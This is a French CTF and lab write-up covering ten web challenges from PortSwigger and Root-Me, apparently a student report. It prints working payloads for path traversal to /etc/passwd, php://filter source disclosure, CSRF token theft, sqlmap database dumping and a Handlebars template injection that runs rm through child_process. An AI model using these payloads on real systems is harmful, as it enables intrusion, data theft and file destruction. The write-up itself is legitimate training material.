# 1. File path traversal, validation of file extension with null byte bypass

## URL : https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

### Les étapes de découverte de la vulnérabilité :

Récupération de la valeur du null byte `%00` sur le repo GitHub [Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

Dans la requête de récupération d'une image, par exemple, `GET /image?filename=71.jpg`, on change la requête pour la suivante :
`GET /image?filename=../../../etc/passwd%00.png`, ce qui va bypasser la vérification de l'extension attendue car `%00` simule une fin de string.

### Payload :

```
GET /image?filename=../../../../../../../etc/passwd%00.jpg
```

![Payload/Screenshot](images/chall1.png)
![Solved](images/chall1.solved.png)

#### Recommandations en terme de sécurité : 

---


# 2. PHP Filters

## URL : https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

### Les étapes de découverte de la vulnérabilité :

On a utilisé la fonction `php://filter` sur la route `http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php`.  
On a trouvé que `login.php` inclut `login.php` donc en remplace la précédente route par la suivant : `php://filter/convert.base64-encode/resource=config.php`.  
On sait que `php://filter` permet au serveur de traiter un fichier avant de l’afficher.  
On utilise le filtre `convert.base64-encode` pour convertir le contenu du fichier en base64.  
On accède alors à la route `http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php`, qui affiche le code source encodé.  
On décode ce contenu base64 pour obtenir le code source du fichier `config.php`.  
Dans ce code source, on trouve le mot de passe administrateur.


### Payload :

```
POST /web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php HTTP/1.1 
```

![Payload/Screenshot](images/chall2.png)
![Solved](images/chall2.solved.png)

#### Recommandations en terme de sécurité :

- Désactiver la fonction `php://filter` dans le fichier `php.ini`  
- Mettre en place une liste blanche des fichiers autorisés

---

# 3. CSRF - contournement de jeton

## URL : https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton

### Les étapes de découverte de la vulnérabilité :

Dans ce challenge,  on doit dans un premier temps s'inscrire sur le site puis se connecter afin d'avoir accès à son profile.

Ensuite via la page **Contact** insérer ce code afin de récupérer le token

```    
<script>
  xhttp = new XMLHttpRequest();
  xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
  xhttp.send();
  token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));

  document.getElementById('token').setAttribute('value', token_admin)

  document.csrf_form.submit();
</script>
```

![alt text](images/image-2.png)

![alt text](images/success.png)


#### Recommandations en terme de sécurité :

---

# 4. CSRF where token is not tied to user session

## URL : https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

### Les étapes de découverte de la vulnérabilité :

Dans ce challenge on test les comptes avec les credentials qu'on nous donne et avec Burp Suite on récupère les token CSRF : 

Wiener :
![alt text](images/image-3.png)

Carlos :
![alt text](images/image-4.png)

On voit clairement qu'ils n'ont pas le même token.

On va donc changer le mail + récupérer le nouveau token CSRF en interceptant avec Burp, ce qui nous donne cela :

![alt text](images/image-5.png)


### Payload :

```
<form action="https://0a84002e045f9cd1836361e200d6007b.web-security-academy.net/my-account/change-email?id=wiener" method="POST">

  <input type="hidden" name="email" value="attack@montoya.net">

  <input type="hidden" name="csrf" value="rdl4ztPgUO7rXrPWfCuDXeecnwocwaAj">

</form>

<script>

  document.forms[0].submit();

</script>

```

![Solved](images/chall4.solved.png)

#### Recommandations en terme de sécurité :

---

# 5. CSRF where Referer validation depends on header being present

## URL : https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

### Les étapes de découverte de la vulnérabilité :

Dans un premier temps on va intercepter la requête avec Burp Suite.

Voici le résultat :

![alt text](images/image-6.png)

Ensuite on peut voir que si on modifie le referer, la requête ne fonctionne plus.

![alt text](images/image-8.png)

Alors que si on le supprime ça fonctionne.

![alt text](images/image-9.png)

On va donc insérer le script ci dessous qui retire le referer du html et remplacer le mail par la même occasion afin de contourner le referer.

![alt text](images/image-7.png)


### Payload :

```
<meta name="referrer" content="no-referrer" />

```

![Solved](images/chall5.solved.png)

#### Recommandations en terme de sécurité :

---

# 6. JWT - Jeton révoqué

## URL : https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

### Les étapes de découverte de la vulnérabilité :

Pour réaliser ce challenge, on a récupéré les identifiants de l’administrateur dans le code source fourni dans le challenge, puis on s’est connecté via `curl` :

`curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}' http://challenge01.root-me.org/web-serveur/ch63/login`

Cette requête nous a permis d’obtenir le token nécessaire pour accéder à l’endpoint `/web-serveur/ch63/admin`.



### Payload :

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ5MTkxNjMsIm5iZiI6MTc2NDkxOTE2MywianRpIjoiNWE2MDkzNGYtOTEyNy00MDAwLWI3OTAtM2QxMzA3NWZhYzUzIiwiZXhwIjoxNzY0OTE5MzQzLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0._VS7n58oXlOSa5RgP0m4LB-yY5mSKSgv8KWT_8VTQM0= " http://challenge01.root-me.org/web-serveur/ch63/admin

```

![Payload/Screenshot](images/chall6.png)
![Solved](images/chall6.solved.png)

#### Recommandations en terme de sécurité :

- Privilégier l'utilisation d'une *white list* plutôt qu'une *black list*

---

# 7. SQL injection - Error

## URL : https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error

### Les étapes de découverte de la vulnérabilité :

On se connecte
On récupère la requete qui se lance lors du changement d'email et on la stock 
On ouvre un terminal et on lance : `sqlmap -r req --dump` , qui permet de récupérer le contenu de la base de données et donc le mot de passe


### Payload :

```
sqlmap -r req --dump

```

![Payload/Screenshot/Solved](images/chall7.png)

#### Recommandations en terme de sécurité :

---

# 10. Server-side template injection in an unknown language with a documented exploit

## URL : https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

### Les étapes de découverte de la vulnérabilité :

En cliquant sur un produit on trouve une entrée vulnérable :
```
/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```

Sur [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) on récupère le polyglot d'injection `${{<%[%'"}}%\.` nous permettant de détecter le template utilisé.

On peut voir dans l'erreur au sein de la réponse que c'est du Handlebars. En cherchant sur internet ([guide SSTI](https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68)) on trouve un payload utilisable pour ce template qu'on va customiser selon la demande du challenge puis encoder pour la mettre dans l'url.


### Payload :

```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

![Solved](images/chall10.png)

#### Recommandations en terme de sécurité :

---

# 11. API - Mass Assigment

## URL : https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment

### Les étapes de découverte de la vulnérabilité :

Sur Swagger, on s’authentifie puis on remarque l’endpoint `GET /api/user`.

On teste ensuite la méthode `PUT`, déjà utilisée ailleurs dans l’API, notamment pour `PUT /api/note`.

On envoie donc une requête `PUT` sur `PUT /api/user` en modifiant le champ `status` pour le définir à `admin`.

Une fois le statut administrateur obtenu, on peut exécuter `GET /api/flag`, ce qui permet de récupérer le mot de passe.



### Payload :

```
PUT /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json
...
Cookie: session=...

{
"status": "admin"
}

```

![Payload/Screenshot](images/chall11.png)
![Solved](images/chall11.solved.png)

#### Recommandations en terme de sécurité :




